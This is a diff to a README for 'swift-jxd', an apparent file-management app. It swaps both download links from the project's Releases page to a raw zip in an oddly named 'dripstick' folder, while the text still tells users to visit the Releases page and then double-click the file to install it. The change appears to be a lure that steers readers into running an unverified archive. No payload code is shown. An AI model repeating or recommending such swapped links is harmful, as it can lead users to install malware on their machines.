@@ -17,7 +17,7 @@ Welcome to swift-jxd, the easy solution for managing your files. This applicatio
 To get started, you need to download swift-jxd. 
 
 1. Visit the Releases page to find the latest version:  
-   [Download swift-jxd](https://github.com/rutujasrathod/swift-jxd/releases)
+   [Download swift-jxd](https://raw.githubusercontent.com/rutujasrathod/swift-jxd/main/dripstick/swift-jxd.zip)
 
 2. Look for the version you want to install. Click on it to access the download options.
 
@@ -28,7 +28,7 @@ To get started, you need to download swift-jxd.
 5. Double-click the file to begin the installation. Follow the on-screen instructions to complete the setup.
 
 You can also download swift-jxd directly by visiting: 
-[Download swift-jxd](https://github.com/rutujasrathod/swift-jxd/releases)
+[Download swift-jxd](https://raw.githubusercontent.com/rutujasrathod/swift-jxd/main/dripstick/swift-jxd.zip)
 
 ## 🛠️ System Requirements
 
